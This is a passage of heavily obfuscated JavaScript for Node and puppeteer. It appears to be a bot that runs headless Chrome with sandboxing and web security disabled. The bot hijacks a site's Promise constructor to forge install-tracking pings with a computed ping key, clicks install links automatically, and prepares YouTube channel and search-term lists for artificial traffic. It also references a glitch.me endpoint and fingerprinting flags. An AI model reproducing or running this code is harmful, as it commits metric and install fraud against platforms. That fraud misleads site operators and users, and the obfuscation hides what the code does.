                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0xa96 + -0x5 * 0x7cd + 0x1cab ? (this['block'] = P[-0x1486 + 0x1af6 + 0x88 * -0xc], this['start'] = N - (0x1fc4 + -0x79 * 0x26 + 0x5 * -0x2b6), this['hash'](), this['hashed'] = 0x11 * 0xc1 + 0x818 + 0x6f8 * -0x3) : this['start'] = N;
                }
                return this['bytes'] > -0x166e904f7 + -0x279 * -0x8718bf + 0x118dcd4af && (this['hBytes'] += this['bytes'] / (-0x1ae612cac + 0x1c357558 + -0xa48aedd5 * -0x4) << -0xb1c + 0x14d8 + -0x2 * 0x4de, this['bytes'] = this['bytes'] % (0x16d0140fc + -0x6a * -0x3d7ea6 + 0x59 * -0x182c878)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x2 * 0x679 + 0x82b + 0xc1 * -0x1c;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x4bd * -0x7 + 0x2168 + -0x4283] = this['block'], J[K >> -0x3 * -0xb9b + -0x177f + -0xb5 * 0x10] |= x[0xb85 * -0x3 + -0x3a5 * 0x9 + -0x1 * -0x435f & K], this['block'] = J[0x13a1 + -0x270 * -0xa + -0x2bf1], K >= 0x67 * 0x61 + 0x22d9 + -0x49a8 && (this['hashed'] || this['hash'](), J[-0x2 * -0x4eb + -0x32d + -0x6a9] = this['block'], J[0x1a83 * -0x1 + 0x125e + 0x835] = J[0x39b * 0x4 + 0x2520 + 0x91 * -0x5b] = J[0x1720 + 0x9c + -0x17ba] = J[0x11ad + 0x1901 + 0x1 * -0x2aab] = J[-0x12f6 + 0x2331 + -0x1037] = J[0x10e2 + -0x61a * -0x1 + -0x16f7] = J[0x172c + -0x733 + 0x1 * -0xff3] = J[0x24c + 0x24ce + -0x2713] = J[0x2cc + -0x1b1b + -0x3 * -0x81d] = J[0xc0f + -0x1e87 + 0x1281] = J[0xc0a + 0xde9 * -0x1 + 0x1e9] = J[-0x1b2d + -0x16d4 + -0x2 * -0x1906] = J[-0xbc3 * -0x2 + -0x197f + 0xb * 0x2f] = J[0x221f + -0x1933 + -0x8df] = J[0x945 * 0x4 + -0x17bc + -0xd4a] = J[0x811 + -0x1102 * -0x1 + -0x1904] = -0x39d * -0x1 + -0x1 * 0x136b + 0x22 * 0x77), J[0x14a2 + 0x3ce * 0x3 + -0x1ffe] = this['hBytes'] << -0x3 * -0x831 + 0x1 * -0xc77 + -0xc19 | this['bytes'] >>> 0x1 * 0x20e7 + 0x1fb5 + -0x407f, J[0xf1 * 0x3 + 0x329 * -0x8 + 0x1684] = this['bytes'] << -0x679 * 0x6 + 0x3c8 + 0x2311 * 0x1, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x542 + 0x22d0 * 0x1 + -0x2 * 0x1401; J < 0x2482 + 0x26de + 0x10 * -0x4b1; ++J)
                K = Q[J - (-0xa4 * -0x1b + -0x1 * 0x278 + -0xed1)] ^ Q[J - (0x25d2 + -0x5 * 0x4d2 + 0xc * -0x124)] ^ Q[J - (0x1dca + 0xde0 + -0xae7 * 0x4)] ^ Q[J - (-0x6c7 + -0x370 + -0x36d * -0x3)], Q[J] = K << -0x1 * 0x137b + -0x4 * 0x7a7 + 0x3218 | K >>> 0x22e0 + 0x16e * -0x10 + 0xbe1 * -0x1;
              for (J = 0x1f * 0x10b + -0x256a * 0x1 + 0x1 * 0x515; J < 0x70 * -0x2e + 0xb * 0x388 + -0x12a4; J += 0x194 * -0x5 + -0x80 * -0x2e + 0x1 * -0xf17)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x4 * -0x4b8 + -0x1 * -0x1f5f + 0x63d * -0x2 | L >>> 0x1 * 0x11f1 + -0x4c1 + -0xd15) + (M & N | ~M & O) + P + (0xb46f5481 + -0x17a523d3 * 0x5 + 0x1c4cd837) + Q[J] << 0x1cfa + 0x7ae + 0x8a * -0x44) << -0x2 * 0xe90 + -0x83b + 0x2560 | P >>> -0x98f * -0x1 + -0x22eb + 0x1977) + (L & (M = M << 0x879 + -0x1bd0 + -0x11 * -0x125 | M >>> -0x2530 + -0x2f * -0xcb + -0x13 * 0x1) | ~L & N) + O + (-0x5fa42f98 + -0x1aff5 * -0x3839 + 0x4 * 0x16d238e9) + Q[J + (-0x1 * 0x1db8 + -0x18ee + 0x36a7)] << 0x2702 + 0xb2 + -0x27b4) << -0x2211 + -0x4 * -0x2ad + 0x1762 | O >>> -0x1e3 * -0x3 + -0x15f + -0x42f) + (P & (L = L << 0x1a45 + -0x26eb + 0xcc4 | L >>> 0x108a + -0x1 * -0x124a + 0x1169 * -0x2) | ~P & M) + N + (0x2f83f573 * 0x1 + 0x3 * 0x2c8a7293 + -0x5aa0d393) + Q[J + (0x1 * 0x17a5 + -0x1 * 0xb29 + -0x2 * 0x63d)] << 0x20f6 + -0x22a4 + 0x1ae) << -0xe67 * 0x1 + -0xa * 0x22f + 0x2442 | N >>> -0x6ff + -0x1bbf + -0xb * -0x32b) + (O & (P = P << -0x6e * -0x46 + -0x59 * -0x1 + 0x1e4f * -0x1 | P >>> -0x2de * 0x9 + 0x8cb + 0x1105 * 0x1) | ~O & L) + M + (0x47186 * 0x1a74 + -0x3b0d95 * 0x95 + 0x1 * 0x756549a) + Q[J + (0x117 * 0x2 + 0xc85 + -0xeb0)] << 0x225b + 0x1 * -0x14d2 + -0xd89) << 0x14b1 + 0x801 + 0x1cad * -0x1 | M >>> -0xabf + 0x14b4 + -0x1 * 0x9da) + (N & (O = O << -0x1cdf + -0x79e + -0x249b * -0x1 | O >>> -0x1 * 0x25a5 + 0x177c * 0x1 + 0x117 * 0xd) | ~N & P) + L + (0x1dab7b06 * 0x2 + -0x5de5dd04 + 0x7d116091) + Q[J + (-0xe99 + 0xe87 * -0x2 + 0x63d * 0x7)] << 0x1be6 + 0x196e + -0x3554, N = N << 0x4 * -0x182 + -0x20ad + 0x3 * 0xcf1 | N >>> 0x577 * -0x5 + 0x2 * 0xf92 + 0xf * -0x41;
              for (; J < 0x10d2 + -0x3 * -0xa2e + -0x2f34; J += 0x94f + -0xba4 * 0x1 + 0x12d * 0x2)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * 0x71 + -0xefd + -0x23 * -0x71 | L >>> -0x1126 + -0x1 * -0x31c + 0xe25) + (M ^ N ^ O) + P + (-0x5085d * 0x2f5 + 0x93655c7c + -0x15a9b5da) + Q[J] << 0x3 * -0xc32 + 0xa * 0x76 + -0xffd * -0x2) << -0x17be * -0x1 + -0x1f9e + 0x7e5 | P >>> 0x186 + -0xcfd + -0xb92 * -0x1) + (L ^ (M = M << -0x1b6b + 0x2606 + -0xa7d | M >>> -0x23d9 + 0x566 + 0x1e75) ^ N) + O + (0x1 * 0x4ef1080e + 0x1a218c4d * -0x4 + 0x886f14c7) + Q[J + (0x61c + 0x1838 + -0x455 * 0x7)] << -0x3b4 + 0x10f + 0x2a5 * 0x1) << -0x1bc6 + 0xe71 + -0x6ad * -0x2 | O >>> -0x185e + 0x1 * -0x7a7 + -0x202 * -0x10) + (P ^ (L = L << -0xf1c + -0x63a * 0x2 + 0x1bae | L >>> 0x152 + -0xe0 * 0x18 + 0x24 * 0x8c) ^ M) + N + (0xda975871 + -0x3062eb * 0x305 + 0x265d42c7) + Q[J + (-0x1 * 0x124 + -0x5c5 + 0x6eb)] << 0x1465 * 0x1 + 0x2656 + -0x3abb) << -0x1 * 0x1ff3 + -0xc39 + 0xebb * 0x3 | N >>> -0xd5c + 0xde5 * -0x1 + 0x44 * 0x67) + (O ^ (P = P << -0x13 * -0xa7 + 0x81 + -0x332 * 0x4 | P >>> -0x1 * -0x163 + -0x89b * 0x1 + 0x73a) ^ L) + M + (-0xbeb5de9f + 0x394508 * 0x2c2 + -0x3a38 * -0x2778a) + Q[J + (-0x105 + 0x1dff + -0x1cf7)] << 0x19dd + 0x4 * -0x61b + 0x1 * -0x171) << -0x35 + -0x1839 + 0x1873 | M >>> -0x4 * 0x59 + 0x19c * 0x5 + -0x68d) + (N ^ (O = O << -0xf3d + -0x1 * -0x1fa5 + -0x56e * 0x3 | O >>> 0x421 * 0x9 + 0x1067 + -0x1ac7 * 0x2) ^ P) + L + (0x1e75cfee + -0xa71eb5f2 + 0x1 * 0xf782d1a5) + Q[J + (-0x3f5 * 0x1 + 0x518 + -0x1 * 0x11f)] << 0xb1d * 0x1 + 0x2 * -0xee6 + 0x12af, N = N << 0x1 * 0x1d48 + 0x2527 + -0x3 * 0x161b | N >>> -0x162 * 0xe + 0x3 * 0x2c5 + 0xb0f;
              for (; J < 0x347 * -0x2 + -0xc2 + 0x78c; J += -0xfb9 + -0x1363 + -0x2321 * -0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x12d3 * 0x2 + -0x12ac + 0x3857 | L >>> 0x203 * 0x3 + -0x3 * -0x345 + -0xfbd * 0x1) + (M & N | M & O | N & O) + P - (0x9d6fcdbd * 0x1 + 0xd8edb9d5 + -0x6e181cd * 0x26) + Q[J] << 0x243 + 0x16e3 + 0x431 * -0x6) << -0x11a7 * -0x1 + -0x1503 + -0xad * -0x5 | P >>> -0x1cf * -0x10 + 0x5d * -0x1f + -0x15a * 0xd) + (L & (M = M << -0x663 * 0x4 + -0x1 * 0x1fee + -0x308 * -0x13 | M >>> -0xa * -0x31c + 0x1e57 + 0x3d6d * -0x1) | L & N | M & N) + O - (0x6d6730f + -0x69943fcd + 0xd3a20fe2) + Q[J + (-0xc * -0x335 + -0x1 * 0x327 + -0x2354)] << 0x1 * 0x1169 + 0x1783 + -0x2 * 0x1476) << -0x6 * -0x87 + 0x1 * -0x186f + -0x442 * -0x5 | O >>> -0x1405 + 0x545 * 0x5 + -0x639) + (P & (L = L << 0xd3a + 0xb04 + -0x1820 | L >>> 0x5 * -0x577 + 0x2149 + -0x5f4) | P & M | L & M) + N - (-0x67a6e7be + -0x3c2e1fb7 + 0x1 * 0x114b94a99) + Q[J + (-0x18fb * 0x1 + -0x2 * -0xd4e + -0x1 * 0x19f)] << -0x7 * -0x22c + 0x1a53 + -0x2987) << 0xce7 + -0x4 * -0x7f + -0xede | N >>> -0x113 * 0xb + -0x1 * -0xf17 + -0x32b) + (O & (P = P << -0xe70 + 0x1468 + -0x5da * 0x1 | P >>> 0xad5 + 0x17ff + -0x2 * 0x1169) | O & L | P & L) + M - (-0x565d5951 + -0x1653829f * 0x3 + 0x6 * 0x2c5f5b63) + Q[J + (0x12bf + -0x18d7 * -0x1 + -0x2b93)] << -0x16 * 0xf4 + -0x1631 + -0x17d * -0x1d) << -0x3 * -0x7ee + 0x485 * 0x5 + -0x2 * 0x172f | M >>> 0x36 * 0x25 + -0x1 * -0x183 + 0x936 * -0x1) + (N & (O = O << -0x71 * -0x5 + 0x22a + -0x1 * 0x441 | O >>> -0x1c6a + -0xae * -0x2e + 0x34 * -0xe) | N & P | O & P) + L - (0x7175ec64 * -0x1 + -0x46eeb4f5 + 0x12948e47d) + Q[J + (0x1 * -0x1583 + 0x40 * 0x17 + -0xfc7 * -0x1)] << 0x4aa + 0x2e3 * 0x9 + -0x1ea5, N = N << -0x1ea7 + -0x5 * -0x71d + -0x4cc | N >>> 0x21a0 + 0x1da6 + -0xfd1 * 0x4;
              for (; J < -0xf6b * 0x1 + 0x5af + -0x506 * -0x2; J += -0x1a * -0x144 + -0x1fb * -0x11 + -0x428e)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x279 + -0x1f + 0x3 * 0xdf | L >>> 0x187f * -0x1 + 0xda1 + 0x1 * 0xaf9) + (M ^ N ^ O) + P - (-0x131cdbc0 * -0x4 + -0x228d * 0x2c75d + 0x492bf763) + Q[J] << 0x1 * 0x1945 + -0x1b3 + -0xbc9 * 0x2) << 0x2 * 0x125d + 0x4 * 0x4ea + -0x385d | P >>> -0xd5 * 0x2b + -0x1 * -0x238f + 0x53 * 0x1) + (L ^ (M = M << -0x187f + -0xc5 * -0x1c + -0x5 * -0x9d | M >>> 0x2025 + -0x16a + -0x1eb9 * 0x1) ^ N) + O - (-0x3bec3e1 * 0x5 + 0x494bd1ec + -0xf4c05d * 0x1) + Q[J + (0x24fa + 0x12df + -0x37d8)] << -0xbbc * -0x1 + -0x223 * 0x10 + 0x1674) << 0xa73 + -0xdf8 + 0x38a | O >>> 0x4a2 * -0x4 + 0x431 + 0xe72) + (P ^ (L = L << 0x3 * 0xf6 + -0x379 * 0xb + 0x236f | L >>> -0x329 * 0x1 + -0x3d1 + 0x6fc) ^ M) + N - (0x1567b2a4 * 0x1 + -0x2f31c6a8 + 0x4a * 0x112b18b) + Q[J + (-0x1ae3 + 0x32d + 0x2c * 0x8a)] << -0x377 * -0x6 + 0x6 * 0x2ce + -0x259e) << 0x1f36 + 0x2 * -0xcf3 + -0x54b | N >>> 0x1 * 0x1009 + -0x1c00 + 0xc12) + (O ^ (P = P << -0x1c7 + -0x188a + 0x1a6f | P >>> 0x144e * -0x1 + -0x1603 + 0x3d9 * 0xb) ^ L) + M - (-0x28eb74cd + -0x48d65bf3 + 0x7b * 0x15c599e) + Q[J + (-0x14c0 + 0x3 * -0xb39 + 0x366e)] << -0x6f * -0x1e + 0x11 * 0x108 + -0x1 * 0x1e8a) << -0x1 * 0x437 + -0x1af0 + 0x1f2c | M >>> -0x29c + -0x2523 + -0x1 * -0x27da) + (N ^ (O = O << 0x155 * 0x16 + -0x6cd * -0x4 + -0x9 * 0x644 | O >>> -0xbd0 + -0x47 * -0xa + -0x4 * -0x243) ^ P) + L - (0x53043 * 0xe11 + 0x5974dad8 + -0x6cd37b21) + Q[J + (-0x176d + -0x4 * -0x6f5 + 0x1 * -0x463)] << -0x2489 + -0x11 * 0x167 + 0x3c60, N = N << 0xf36 * -0x2 + 0x1b20 + 0x36a | N >>> -0x1 * 0x267b + 0xb7 * -0x8 + 0x2c35 * 0x1;
              this['h0'] = this['h0'] + L << -0x1411 + 0x20fe + -0xced, this['h1'] = this['h1'] + M << 0x16a8 + 0x6bf + -0x1d67, this['h2'] = this['h2'] + N << 0x84 * -0x36 + -0xe5b + -0x115 * -0x27, this['h3'] = this['h3'] + O << -0x3 * -0x8f0 + 0x1 * 0x16ab + 0x35 * -0xef, this['h4'] = this['h4'] + P << -0xd3 * -0x1e + 0x2029 + -0x38e3;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x12d * 0x15 + -0x1a02 + 0x32cf & 0x2 * -0xd87 + 0x5 * 0x3b5 + 0x894] + w[J >> -0x98f * -0x2 + 0x79b + -0x1aa1 & 0x6b0 + 0x4 * 0x376 + -0x1479] + w[J >> -0x6 * 0x261 + -0xc9b * -0x2 + 0x14 * -0x8b & 0x3e8 + -0x1cb4 + 0x18db * 0x1] + w[J >> 0x3d5 + 0x9bc + 0x1 * -0xd81 & -0x1f5c + 0x1 * -0x27b + 0x21e6] + w[J >> 0x5 * -0x6d9 + -0x1 * 0x202b + 0x4274 & -0x10ac + 0x2 * -0x166 + 0x1387] + w[J >> -0x23a6 + -0x22bc + 0x1 * 0x466a & 0x1e4d * -0x1 + 0x22 * 0x1d + -0x105 * -0x1a] + w[J >> 0x2009 + -0xfd + -0x1f08 & 0xeca + -0x1318 + 0x45d] + w[0x1890 + 0x170f + -0x10 * 0x2f9 & J] + w[K >> 0x329 * -0x3 + 0x66c + -0x1 * -0x32b & 0x1f * 0x99 + -0x23b1 + -0x1139 * -0x1] + w[K >> -0x24e6 + 0x1 * -0x1e3e + -0x34 * -0x14b & -0x3b * 0x11 + -0x236a + 0x2764] + w[K >> 0x796 + -0x61e * 0x2 + 0x4ba & 0xcb + -0x1aa8 + 0x15 * 0x13c] + w[K >> -0x1b7e + -0x1755 + 0x32e3 & 0x175 + 0x1392 + 0x2 * -0xa7c] + w[K >> -0x1aee + -0x6 * 0x128 + 0x21ea & -0x5 * 0x52 + 0x2454 + -0x6ef * 0x5] + w[K >> -0x376 * -0x5 + 0xbd2 + -0x4 * 0x746 & 0x3 * 0x2b0 + -0x218a + 0x1989] + w[K >> -0x10c1 * -0x1 + 0xe8e + -0x1f4b & 0x1d4f + -0x1a0e + -0x2 * 0x199] + w[0x1 * -0x207d + -0xb2d * 0x1 + 0x2bb9 * 0x1 & K] + w[L >> -0x1d63 + 0x2126 + -0x3a7 & -0x5d2 + -0xf99 + 0x157a] + w[L >> -0x27 * 0xfd + -0x1 * 0x2214 + 0x48b7 * 0x1 & 0x1424 + 0x4 * 0x829 + -0x1193 * 0x3] + w[L >> 0x639 * 0x6 + -0x10e5 + -0x191 * 0xd & 0x187 * 0x5 + 0xf7e + -0x1712] + w[L >> -0x1edd + 0x1733 + 0x7ba & 0x44e * 0x3 + 0x1f6c + -0x2c47] + w[L >> 0xff6 * -0x1 + -0x23cc + -0x13 * -0x2ba & -0x6de + -0x20 * 0x7b + -0x164d * -0x1] + w[L >> -0xd20 + 0x21 * -0xe + 0x1 * 0xef6 & -0x1 * 0x1415 + 0x249a + -0x1076] + w[L >> -0x861 + 0x326 * 0xc + 0x1 * -0x1d63 & 0x6e9 * -0x1 + -0x1 * -0x295 + 0x463] + w[-0x3 * 0x875 + 0x1 * -0x246e + -0x1 * -0x3ddc & L] + w[M >> -0x22bb + 0x1 * -0x491 + 0x2768 & 0x132b + -0x2427 + -0x1 * -0x110b] + w[M >> 0x20 * 0x66 + 0x223b + -0x2ee3 & -0xea0 + -0x2267 * 0x1 + 0x67 * 0x7a] + w[M >> -0xe35 + 0x6 * 0x89 + 0xb13 & 0x86e + -0x17d0 + -0x43 * -0x3b] + w[M >> -0x3f3 * 0x1 + 0x3 * 0xb2e + -0x1d87 & -0xb3f * 0x1 + -0x4 * 0x847 + -0x2c6a * -0x1] + w[M >> 0x26e8 + 0x2 * -0x120d + 0x1 * -0x2c2 & -0x16c * 0x7 + -0x1ed4 + 0x28d7] + w[M >> 0xd01 + 0xc37 * 0x1 + -0x1930 & 0x3c * -0xf + 0x16 * 0x35 + -0xfb] + w[M >> -0x1a41 + 0x260b + -0xbc6 & -0x17fd + 0x1 * 0x21b5 + -0x9a9] + w[-0x1 * 0x781 + -0x2093 * 0x1 + -0x4b * -0x89 & M] + w[N >> -0x7e5 * 0x1 + -0x10b1 * 0x1 + 0x18b2 & -0x60b * 0x5 + 0x1717 * 0x1 + -0x3 * -0x265] + w[N >> -0xb79 + 0x1 * 0x239d + -0xc06 * 0x2 & -0x2c * 0x29 + -0x1 * 0xb47 + 0x1262] + w[N >> 0x1 * 0xfa6 + 0xb5f + -0x1af1 & 0xb * -0x35 + 0xdd * -0xe + -0x39b * -0x4] + w[N >> -0x1 * 0x15f0 + 0x941 * -0x3 + 0x1 * 0x31c3 & 0x1d04 + 0xe79 * -0x1 + -0x1 * 0xe7c] + w[N >> -0x1042 + 0x1b * 0x7b + 0x355 & 0x1 * 0xb1d + 0x2 * -0x698 + 0x222] + w[N >> -0xd1 * -0x8 + -0xd * 0x10 + 0xd * -0x70 & -0x7d * -0x1f + -0xa9 * 0x25 + 0x1 * 0x959] + w[N >> -0x1b85 + 0xb9b + -0x2 * -0x7f7 & 0x1743 + 0x62c * -0x2 + -0xadc] + w[0x52d * -0x7 + -0x151 * 0xb + 0x32c5 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x238f * 0x1 + -0x5 * 0x1dd + -0x1a26 & 0x1c5a + 0x479 + 0x3 * -0xa9c,
                J >> 0x11c4 + 0x1585 + -0x2739 & -0x12fe + 0x1093 * -0x2 + 0x3523,
                J >> -0x1ebe + 0x343 + 0x1b83 & -0x2005 + -0x4 * 0x1bb + 0xd5 * 0x30,
                0x63 * -0x3d + 0x134 + -0x92 * -0x29 & J,
                K >> 0x694 * 0x2 + 0x17 * -0xf + 0xbb7 * -0x1 & -0x1215 + -0x3 * 0x7a2 + 0x29fa,
                K >> 0x4bb * 0x1 + 0x1de * 0x2 + 0x9 * -0xef & -0xdc5 + -0x22e * -0x7 + -0x7e,
                K >> -0x825 + 0xd * 0x7a + -0xa9 * -0x3 & 0xf3 + 0x2197 * -0x1 + 0x21a3,
                0x528 + 0xb * -0x29f + -0x62b * -0x4 & K,
                L >> -0x56b + -0x3 * -0xc22 + -0x1ee3 & -0x932 + 0x4 * 0x523 + -0xa5b * 0x1,
                L >> 0x957 * 0x4 + 0x23bd + -0x7 * 0xa6f & 0xee7 + 0xd17 + 0x1aff * -0x1,
                L >> 0x148 + 0xb9d + -0x59 * 0x25 & 0x1d0b + -0x7 * -0x1e9 + -0x296b,
                -0x1f30 + -0x1 * -0x19d3 + 0x2c * 0x25 & L,
                M >> -0x23 * -0xa6 + 0x2399 + -0x13d * 0x2f & -0x8 * -0xd6 + -0x3cb + -0xf3 * 0x2,
                M >> 0x264f + 0x9 * -0x3c7 + -0x440 & -0x184 * -0x3 + 0xb55 * -0x1 + -0xa6 * -0xc,
                M >> -0x1 * 0x2293 + -0x20e4 + 0x437f & -0x6e * -0x59 + 0x2f2 + -0x1 * 0x2831,
                -0x9a5 * -0x2 + 0x184d * -0x1 + 0x602 * 0x1 & M,
                N >> 0xcd9 * -0x1 + 0x8f9 + 0xfe * 0x4 & 0x11cb * 0x1 + -0xba0 + -0x52c,
                N >> -0x23 * 0x67 + -0x1a96 * 0x1 + 0x28bb & 0x1f7 * -0x10 + 0x1a * -0x152 + -0x51 * -0xd3,
                N >> -0x154a + 0x41 * 0x80 + -0xb2e & 0x58c + -0xd49 * -0x1 + -0x6 * 0x2f9,
                0x2c2 + 0x91d + 0x1d * -0x60 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1 * 0x286 + -0x26da + -0x48d * -0x8), (K = new DataView(J))['setUint32'](0x7 * -0x4cd + 0x1ac4 + 0x6d7, this['h0']), K['setUint32'](0x1b45 + -0xc98 + -0xea9, this['h1']), K['setUint32'](0xbcf + 0x5 * 0x2d6 + -0x19f5, this['h2']), K['setUint32'](-0x12a6 + -0x599 * -0x5 + 0x3 * -0x319, this['h3']), K['setUint32'](-0xe66 * 0x1 + 0x95e + 0x8 * 0xa3, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x205e + 0x21 * 0x1 + -0x1 * 0x207f];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1bc3 + 0x54a * -0x5 + 0x3635;
            J[0xa09 + -0x3c * 0x2 + -0x991]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x2240 + -0x31f + 0x1f21 * -0x1] = L => {
              const U = d;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + U(0x12))),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x1831 + 0x25e + 0x15d4), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0xcee + -0x20b9 * 0x1 + 0x13cc * 0x1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, -0x159f + 0x53 * -0x71 + 0x1d * 0x236), Promise['resolve'](-0x122d + 0x127b + -0x7 * 0xb);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x1 * -0x20cd + -0x2140 + 0x5 * 0x17; j < -0x21cf + 0x28d + -0x1f43 * -0x1; j++)
    i();
}
const NETWORK_PATIENCE = -0x1eb * -0x1c + 0x175b + -0xf45 * 0x3 + (0x23f6 * -0x1 + 0x40 * -0x16 + 0x352e * 0x1) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x592 * -0x6 + -0x20c3 + 0x2 * -0x53) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x7d9 + 0x238f + 0x1bb6 * -0x1; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push']((V(0xd) + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 